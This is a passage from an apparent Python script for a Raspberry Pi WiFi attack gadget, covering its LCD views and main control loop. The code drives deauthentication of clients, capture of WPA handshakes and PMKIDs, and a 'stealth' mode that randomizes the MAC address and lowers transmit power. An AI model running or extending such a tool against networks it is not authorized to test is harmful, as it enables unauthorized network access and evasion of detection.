    strip_chs = all_channels[strip_start:strip_end]

    cell_w = 124 // max(len(strip_chs), 1)
    cell_w = max(8, min(cell_w, 12))

    # Scroll arrows
    if strip_start > 0:
        d.text((0, strip_y), "<", font=font_sm, fill="#555")
    if strip_end < len(all_channels):
        d.text((124, strip_y), ">", font=font_sm, fill="#555")

    for i, ch in enumerate(strip_chs):
        x = 2 + i * cell_w
        if ch == sel_ch:
            d.rectangle((x - 1, strip_y - 1, x + cell_w - 2, strip_y + 9),
                         fill="#333")
            ch_color = "#FFFFFF"
        elif ch == cur_ch:
            ch_color = "#00FFFF"
        elif ch_act.get(ch, 0) > 0:
            ch_color = "#00FF00" if ch <= 14 else "#FF00FF"
        else:
            ch_color = "#333"
        d.text((x, strip_y), str(ch), font=font_sm, fill=ch_color)

    # --- Mini bar chart for selected channel neighborhood (y=24-48) ---
    bar_top = 25
    bar_h_max = 22
    max_act = max((ch_act.get(c, 0) for c in strip_chs), default=1) or 1

    for i, ch in enumerate(strip_chs):
        x = 2 + i * cell_w
        act = ch_act.get(ch, 0)
        bh = max(1, int(act / max_act * bar_h_max)) if act > 0 else 0

        if ch == sel_ch:
            bar_color = "#FFFFFF"
        elif ch == cur_ch:
            bar_color = "#00FFFF"
        elif ch > 14:
            bar_color = "#FF00FF" if act > max_act * 0.3 else "#331133"
        elif act > max_act * 0.6:
            bar_color = "#00FF00"
        elif act > 0:
            bar_color = "#FFAA00"
        else:
            bar_color = "#181818"

        if bh > 0:
            d.rectangle((x, bar_top + bar_h_max - bh,
                          x + cell_w - 2, bar_top + bar_h_max),
                         fill=bar_color)
        else:
            d.line((x, bar_top + bar_h_max, x + cell_w - 2,
                     bar_top + bar_h_max), fill="#181818")

    # --- Separator ---
    sep_y = bar_top + bar_h_max + 2
    d.line([(0, sep_y), (127, sep_y)], fill="#333")

    # --- APs on selected channel (y=sep+2 to y=115) ---
    y = sep_y + 2

    aps_on_ch = [
        (bssid, info) for bssid, info in aps_snap.items()
        if info.get("channel") == sel_ch
    ]
    aps_on_ch.sort(key=lambda x: len(x[1].get("clients", set())),
                   reverse=True)

    rows_avail = (114 - y) // 10
    if aps_on_ch:
        for bssid, info in aps_on_ch[:rows_avail]:
            essid = info.get("essid", "?")[:12]
            cli = len(info.get("clients", set()))
            sig = info.get("signal", -99)
            pwned = "!" if bssid in captured else " "
            name_color = "#00FF00" if bssid in captured else "#FFFFFF"
            d.text((2, y), f"{pwned}{essid}", font=font_sm, fill=name_color)
            d.text((80, y), f"{cli}c", font=font_sm, fill="#FFAA00")
            d.text((100, y), f"{sig}", font=font_sm, fill="#888")
            y += 10
        if len(aps_on_ch) > rows_avail:
            d.text((2, y), f"+{len(aps_on_ch) - rows_avail} more",
                   font=font_sm, fill="#555")
    else:
        d.text((4, y), f"CH{sel_ch}: no APs", font=font_sm, fill="#444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "L/R:Nav K1:View K3:Back",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Captures view (browsable history)
# ---------------------------------------------------------------------------


def _list_captures():
    """Return sorted list of capture filenames from HANDSHAKE_DIR."""
    if not os.path.isdir(HANDSHAKE_DIR):
        return []
    try:
        files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".pcap")]
        files.sort(reverse=True)  # newest first
        return files
    except Exception:
        return []


def _draw_captures(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    captures = _list_captures()
    count = len(captures)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#112211")
    d.text((2, 1), f"CAPTURES ({count})", font=font_sm, fill="#00FF00")

    if not captures:
        d.text((4, 40), "No captures yet", font=font_sm, fill="#666")
        d.text((4, 55), "Start hunting!", font=font_sm, fill="#444")
    else:
        visible = captures[scroll:scroll + 7]
        for i, fname in enumerate(visible):
            y = 16 + i * 14
            # Determine type by prefix for color coding
            name_display = fname.replace(".pcap", "")
            if fname.startswith("hs4_"):
                color = "#00FF00"   # green = full handshake
                prefix = "!"
            elif fname.startswith("hs_half_"):
                color = "#FFAA00"   # yellow = half handshake
                prefix = "~"
            elif fname.startswith("pmkid_"):
                color = "#FF00FF"   # purple = PMKID
                prefix = "*"
            else:
                color = "#CCCCCC"
                prefix = " "
            d.text((2, y), f"{prefix} {name_display[:21]}",
                   font=font_sm, fill=color)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "U/D:Scroll K1:View K3:Back",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Whitelist view
# ---------------------------------------------------------------------------


def _draw_whitelist(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#442200")
    d.text((2, 1), "WHITELIST", font=font_sm, fill="#FFAA00")

    lines = []
    for mac in sorted(whitelist_macs):
        lines.append(f"MAC {mac[-11:]}")
    for ssid in sorted(whitelist_ssids):
        lines.append(f"SSID {ssid[:14]}")

    if not lines:
        d.text((4, 30), "Whitelist empty", font=font_sm, fill="#666")
        d.text((4, 45), "Edit config.json in", font=font_sm, fill="#666")
        d.text((4, 57), LOOT_DIR[:22], font=font_sm, fill="#444")
        d.text((4, 75), "Add your own WiFi", font=font_sm, fill="#666")
        d.text((4, 87), "to avoid deauthing it", font=font_sm, fill="#666")
    else:
        visible = lines[scroll:scroll + 7]
        for i, line in enumerate(visible):
            y = 16 + i * 13
            d.text((2, y), line[:22], font=font_sm, fill="#CCCCCC")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(lines)} entries K1:View K3:X",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main():
    global _running, capturing, deauth_enabled, stealth_enabled
    global mon_iface, view, original_mac, capture_flash

    capture_flash = 0  # ensure no residual flash from previous run
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    _load_stats()
    _load_config()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font(10)
    font_sm = scaled_font(8)

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi")
    if not iface:
        GPIO.cleanup()
        return 1

    # Save original MAC for restore
    original_mac = _get_mac(iface)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Monitor mode...", font=font_obj, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    mon_iface = _monitor_up(iface)
    if not mon_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "Monitor mode fail", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Start activity sampler thread
    threading.Thread(target=_activity_sampler, daemon=True).start()

    scroll = 0

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view != "face":
                    view = "face"
                    time.sleep(0.3)
                else:
                    break

            elif btn == "OK":
                if not capturing:
                    capturing = True
                    threading.Thread(target=_channel_hopper,
                                    daemon=True).start()
                    threading.Thread(target=_sniffer, daemon=True).start()
                    threading.Thread(target=_half_hs_checker,
                                    daemon=True).start()
                else:
                    capturing = False
                time.sleep(0.3)

            elif btn in ("LEFT", "RIGHT") and view == "face":
                deauth_enabled = not deauth_enabled
                _save_config()
                time.sleep(0.3)

            elif btn == "LEFT" and view == "stats":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "RIGHT" and view == "stats":
                scroll += 1
                time.sleep(0.15)

            elif btn == "KEY1":
                # Cycle views: face > stats > captures > whitelist
                if view == "face":
                    view = "stats"
                elif view == "stats":
                    view = "captures"
                elif view == "captures":
                    view = "whitelist"
                else:
                    view = "face"
                scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2":
                # Toggle stealth
                stealth_enabled = not stealth_enabled
                if stealth_enabled and mon_iface:
                    _randomize_mac(mon_iface)
                    _reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    _restore_mac(mon_iface, original_mac)
                    _restore_tx_power(mon_iface)
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            if view == "face":
                _draw_face(lcd, font_obj, font_sm)
            elif view == "stats":
                _draw_stats(lcd, font_obj, font_sm, scroll)
            elif view == "captures":
                _draw_captures(lcd, font_obj, font_sm, scroll)
            elif view == "whitelist":
                _draw_whitelist(lcd, font_obj, font_sm, scroll)

            time.sleep(0.05)

    finally:
        _running = False
        capturing = False
        _save_stats()
        _save_config()
        if stealth_enabled and mon_iface:
            _restore_mac(mon_iface, original_mac)
            _restore_tx_power(mon_iface)
        time.sleep(0.5)
        _monitor_down(mon_iface)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
